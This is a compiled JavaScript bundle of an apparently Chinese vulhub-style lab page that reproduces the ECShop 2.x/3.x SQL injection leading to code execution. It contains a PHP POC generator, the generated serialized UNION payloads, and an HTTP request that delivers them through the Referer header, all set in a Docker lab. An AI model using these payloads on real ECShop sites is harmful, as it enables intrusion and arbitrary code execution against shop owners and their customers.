import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o,c as p,a as n,b as s,d as i,e as l}from"./app-58e4a7d6.js";const c={},d=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。",-1),r=n("p",null,"其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。",-1),v=n("p",null,"参考链接：",-1),k={href:"https://paper.seebug.org/691/",target:"_blank",rel:"noopener noreferrer"},b=l(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>执行如下命令启动ecshop 2.7.3与3.6.0：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问<code>http://your-ip:8080</code>将看到2.7.3的安装页面，访问<code>http://your-ip:8081</code>将看到3.6.0的安装页面。</p><p>依次安装二者，mysql地址填写<code>mysql</code>，mysql账户与密码均为<code>root</code>，数据库名随意填写，但2.7.3与3.6.0的数据库名不能相同。</p><p>注册普通用户user。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>POC脚本：</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$shell</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;{\\$asd&#39;];phpinfo\\t();//}xxx&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;-1&#39; UNION/*&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string double-quoted-string">&quot;num&quot;</span> <span class="token operator">=&gt;</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#39;</span><span class="token punctuation">,</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$shell</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token string double-quoted-string">&quot;id&quot;</span> <span class="token operator">=&gt;</span> <span class="token variable">$id</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$hash3</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;45ea207d7a2b68c49582d2d22adf953a&#39;</span><span class="token punctuation">;</span>
<span class="token variable">$hash2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;554fcae493e564ee0dc75bdf2ebf94ca&#39;</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;POC for ECShop 2.x: \\n&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$hash2</span><span class="token punctuation">}</span></span>ads|<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$s</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$hash2</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;\\n\\nPOC for ECShop 3.x: \\n&quot;</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$hash3</span><span class="token punctuation">}</span></span>ads|<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$s</span><span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$hash3</span><span class="token punctuation">}</span></span>&quot;</span><span class="token punctuation">;</span>
</span></code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POC for ECShop 2.x: 
554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION/*&quot;;}554fcae493e564ee0dc75bdf2ebf94ca

POC for ECShop 3.x: 
45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#39; UNION/*&quot;;}45ea207d7a2b68c49582d2d22adf953a
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>生成的POC，放在Referer里发送：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /user.php?act=login HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: [POC HERE]
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>2.x的执行结果：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222310789.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>3.x的执行结果（使用3.x的POC执行不成功，使用2.x的POC执行成功）：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202222325965.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,16);function h(m,g){const a=t("ExternalLinkIcon");return o(),p("div",null,[d,u,r,v,n("ul",null,[n("li",null,[n("a",k,[s("https://paper.seebug.org/691/"),i(a)])])]),b])}const q=e(c,[["render",h],["__file","ECShop 2.x3.x SQL注入任意代码执行漏洞.html.vue"]]);export{q as default};
